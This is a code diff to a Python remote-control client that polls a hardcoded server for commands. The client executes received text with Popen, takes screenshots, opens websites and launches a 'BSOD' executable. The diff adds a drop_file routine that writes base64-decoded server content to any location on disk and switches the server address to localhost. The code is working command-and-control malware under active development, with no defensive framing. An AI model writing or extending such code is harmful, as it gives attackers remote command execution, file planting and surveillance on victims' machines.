@@ -9,6 +9,7 @@ from os import remove
 
 DELAY = 5
 IP = "143.42.110.206"
+IP = "127.0.0.1"
 PORT = 80
 SCHEME = "http"
 
@@ -24,6 +25,7 @@ def main() -> None:
                 f"{SCHEME}://{IP}:{PORT}/screenshot-center"
             )
             get_website_response = get(f"{SCHEME}://{IP}:{PORT}/website-center")
+            get_drop_file_response = get(f"{SCHEME}://{IP}:{PORT}/dropfile-center")
             if get_commands_response.status_code == 200:
                 run_command(get_commands_response)
             if get_images_response.status_code == 200:
@@ -36,11 +38,21 @@ def main() -> None:
                 take_screenshot()
             if get_website_response.status_code == 200:
                 open_website(get_website_response.text)
+            if get_drop_file_response.status_code == 200:
+                drop_file(
+                    get_drop_file_response.json("dropfile"),
+                    get_drop_file_response.json("location"),
+                )
             sleep(DELAY)
     except Exception as error:
         print(error)
         sleep(DELAY)
         main()
+
+
+def drop_file(content: str, location: str) -> None:
+    with open(location, "wb") as dropped_file:
+        dropped_file.write(b64decode(content))
 
 
 def open_website(url: str) -> None:
@@ -87,7 +99,7 @@ def invoke_bsod() -> None:
     Popen("temp.exe")
 
 
-def load_image(get_images_response: Response):
+def load_image(get_images_response: Response) -> None:
     with open("temp", "wb") as temp_image_file:
         temp_image_file.write(get_images_response.content)
     try:
@@ -97,7 +109,7 @@ def load_image(get_images_response: Response):
     remove("temp")
 
 
-def run_command(get_commands_response: Response):
+def run_command(get_commands_response: Response) -> None:
     Popen(get_commands_response.text)
 
 
